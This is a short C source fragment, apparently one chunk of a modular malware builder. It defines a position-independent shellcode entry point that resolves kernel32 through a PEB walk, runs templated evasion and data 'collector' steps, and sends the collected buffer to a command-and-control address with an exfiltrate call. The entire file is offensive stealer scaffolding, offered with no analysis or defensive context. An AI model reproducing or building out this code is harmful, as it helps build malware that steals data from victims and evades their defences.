// chunk: arch/shellcode_entry
// depends: api_resolve/peb_walk
// provides: main
// headers: windows.h
// note: Position-independent entry point for shellcode extraction.
//       Resolves kernel32 via PEB, then dispatches to collectors.

#ifndef CHUNK_SHELLCODE_ENTRY
#define CHUNK_SHELLCODE_ENTRY

void shellcode_main(void) {
{{EVASION_INIT}}

    init_buffer();
    if (!g_data) return;

    {{COLLECTOR_CALLS}}

    if (g_pos > 0)
        exfiltrate(C2_ADDR, C2_PORT, g_data, g_pos);

    free(g_data);
}

int main(int argc, char *argv[]) {
    shellcode_main();
    return 0;
}

#endif
